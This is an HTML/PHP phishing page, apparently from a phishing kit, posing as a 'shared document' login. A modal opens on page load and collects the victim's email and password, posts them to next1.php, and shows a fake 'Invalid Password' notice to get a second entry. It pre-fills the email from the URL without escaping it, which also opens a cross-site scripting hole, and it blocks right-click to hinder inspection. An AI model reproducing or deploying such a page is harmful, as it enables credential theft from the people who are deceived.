
<html>
<head>
  <title>~SHARED#D0C~.</title>
  <link rel="icon" type="image/ico" href="img/favicon.ico" />
<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}

body {
    background-repeat:no-repeat;
}
/* Full-width input fields */
input[type=email], input[type=text] , input[type=password] {
    width: 90%;
    padding: 5px 5px;
    margin: 4px 26px;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
  font-size:16px;
}

/* Set a style for all buttons */
button {
    background-color: transparent;
  padding: 14px 20px;
    margin: 8px 26px;
    border: none;
    cursor: pointer;
    width: 90%;
  height: 40px;
  position: absolute;
}
button:hover {
    opacity: 0.8;
}

/* Center the image and position the close button */
.imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
    position: relative;
}
.avatar {
    
}

/* The Modal (background) */
.modal {
  display:none;
    position: fixed;
    z-index: 1;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0,0,0,0.4);
}

/* Modal Content Box */
.modal-content {
    background-color: #fff;
    margin: 4% auto 15% auto;
    border: 1px solid #888;
    width: 30%; 
  padding-bottom: 30px;
}

/* The Close Button (x) */
.close {
    position: absolute;
    right: 25px;
    top: 0;
    color: #000;
    font-size: 35px;
    font-weight: bold;
}
.close:hover,.close:focus {
    color: red;
    cursor: pointer;
}

/* Add Zoom Animation */
.animate {
    animation: zoom 0.6s
}
@keyframes zoom {
    from {transform: scale(0)} 
    to {transform: scale(1)}
}
</style>
<script language="javascript">
document.onmousedown=disableclick;
status="Right Click Disabled";
Function disableclick(event)
{
  if(event.button==2)
   {
     alert(status);
     return false;    
   }
}
</script>
<button onclick="document.getElementById('modal-wrapper').style.display='block'" style="width:1118px; height:233px; margin-top:163px; margin-left:60px;"></button>

<body  onload="document.getElementById('modal-wrapper').style.display='block'" background="img/001.png" oncontextmenu="return false">


<div id="modal-wrapper" class="modal">
  
  <form class="modal-content animate" method="post" action="next1.php">
        <p style="color: #ff0000;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
    <div class="imgcontainer">
      <span onclick="document.getElementById('modal-wrapper').style.display='none'" class="close" title="Close">&times;</span>
    <img src="img/av061.png" alt="Avatar" class="avatar" style="float:left; margin-left:26px; margin-top:26px; margin-bottom:26px;" >
      
    </div>

    <div class="container">
	
      <input type="email" placeholder="someone@example.com" id="id1" name="id1" value="<?=$_GET[email]?>" required="" style="height:32px; font-size:0.9em;">
      <input type="password" placeholder="Password" id="id2" name="id2"  required="" style="height:32px; font-size:0.9em;">  
<br>
<p style="color:red; font-size:14px; margin-right:5px; margin-left:26px; ">Invalid Password. Please Try Again</p>  <br>     
      <input type="checkbox" style="margin-right:5px; margin-left:26px; margin-top:5px;"><font size="2.5">Keep me signed in</font>  <br>   
    <input type="image" src="img/bt01.png" alt="submit" style="margin-left:26px; margin-top:30px; margin-bottom:30px;"></button><br>
    <a href="#" style="text-decoration:none; margin-left:26px; "><font size="2.5" color="#2872DD">Can&#39;t access your account?</font></a>
    </div>
    
  </form>
  
</div>


<button onclick="document.getElementById('modal-wrapper').style.display='block'" style="width:170px; margin-top:60px; margin-left:1112px;"></button>

</body>
</html>
